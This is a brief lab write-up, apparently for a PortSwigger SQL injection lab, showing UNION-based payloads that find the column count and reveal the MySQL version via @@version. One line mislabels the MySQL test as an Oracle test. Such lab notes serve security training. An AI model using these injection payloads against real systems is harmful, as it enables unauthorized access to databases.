# SQL injection attack, querying the database type and version on MySQL and Microsoft
* This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
	* To solve the lab, display the database version string.

### 1. Determine the corresponding number of columns
```sql
' UNION SELECT NULL,NULL--
```
* However, it does not work. It might be another database is using.
#### Test the syntax for MySQL
```bash
'UNION SELECT NULL,NULL;-- -
```
* Testing for two columns returns 200 status code. It means that there has two columns.

### 2. Find the version number for MySQL
* Since MySQL is used on the web page, find ther version number.
	* Test for MySQL database using the [Portswigger SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* For the testing for Oracle database, the version number is revealed.
```sql
' UNION SELECT NULL, @@version;-- -
```

* As a result, the lab is solved.
